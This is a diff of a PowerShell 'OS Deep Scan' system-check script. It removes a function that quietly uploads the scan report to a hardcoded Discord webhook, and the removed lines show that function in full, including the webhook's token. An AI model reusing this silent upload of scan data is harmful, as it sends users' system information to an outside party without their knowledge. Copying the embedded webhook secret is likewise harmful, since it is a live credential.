@@ -273,38 +273,6 @@ function Get-FirmwareSecurityState {
 	Write-Host ">> Firmware security checks complete!`n"
 }
 
-# === DISCORD WEBHOOK HANDLING ===
-$webhooks = @(
-	"https://discord.com/api/webhooks/1359737424871162029/rvZQsCRDL6-_-iZUEjfJSs-PJlfXeh-qW2PckJsytD8aEUNrn-JvCEFJUdnlRodU5Fpr"
-)
-function Send-DiscordWebhook {
-	$boundary = [System.Guid]::NewGuid().ToString()
-	$LF = "`r`n"
-
-	$fileName = [System.IO.Path]::GetFileName($outputFile)
-	$fileBytes = [System.IO.File]::ReadAllBytes($outputFile)
-	$fileContent = [System.Text.Encoding]::ASCII.GetString($fileBytes)
-
-	$bodyLines = @()
-	$bodyLines += "--$boundary"
-	$bodyLines += "Content-Disposition: form-data; name=`"file1`"; filename=`"$fileName`""
-	$bodyLines += "Content-Type: text/plain$LF"
-	$bodyLines += $fileContent
-	$bodyLines += "--$boundary--$LF"
-
-	$body = $bodyLines -join $LF
-	$bodyBytes = [System.Text.Encoding]::ASCII.GetBytes($body)
-
-	$headers = @{
-		"Content-Type" = "multipart/form-data; boundary=$boundary"
-	}
-
-	foreach ($url in $webhooks) {
-		$ProgressPreference = 'SilentlyContinue'
-		Invoke-WebRequest -Uri $url -Method Post -Body $bodyBytes -Headers $headers
-	}
-}
-
 # === RUN ALL CHECKS ===
 Write-Host "`n======== OS Deep Scan Written by @imluvvr & @ScaRMR6 on X ========"
 Write-Host "`n                    Starting PC Scans..."
@@ -337,7 +305,6 @@ Get-FirmwareSecurityState
 Add-Content -Path $outputFile -Value "`n========================================"
 Add-Content -Path $outputFile -Value "Scan Completed: $(Get-Date -Format 'yyyy-MM-dd @ HH:mm:ss')"
 Add-Content -Path $outputFile -Value "`nWritten by @imluvvr & @ScaRMR6 on X"
-Send-DiscordWebhook
 Clear-Host
 
 Write-Host "`n======== OS Deep Scan Written by @imluvvr & @ScaRMR6 on X ========"
